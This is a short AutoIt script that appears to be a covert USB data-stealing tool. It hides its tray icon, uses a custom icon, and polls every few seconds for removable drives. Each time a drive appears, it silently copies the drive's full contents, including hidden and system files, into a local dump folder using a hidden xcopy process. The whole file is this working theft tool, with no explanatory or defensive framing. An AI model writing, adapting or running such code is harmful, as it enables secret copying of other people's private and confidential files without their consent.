#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_icon=thumb.ico
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
Opt("TrayIconHide", 1)
$DumpDir = @WorkingDir & "\"
$OldCount=0
while 1	
		$var=DriveGetDrive ( "REMOVABLE" )
		If  not @error and $var[0] <> $OldCount Then
			For $i = 1 to $var[0]
				if $var[$i] <> "a:" then
					$CommandString = 'xcopy ' & $var[$i] & '\ ' & '"' & $DumpDir & DriveGetLabel ($var[$i]) & '-Dump" /EHY'
					;MsgBox(4096, "", $CommandString)
					DirCreate(DriveGetLabel ($var[$i]) & "-Dump")
					;MsgBox(4096, "", DriveGetLabel ($var[$i]))
					Run($CommandString, "", @SW_HIDE)
				EndIf
			Next
			$OldCount=$var[0]
		EndIf
		sleep (5000)
WEnd
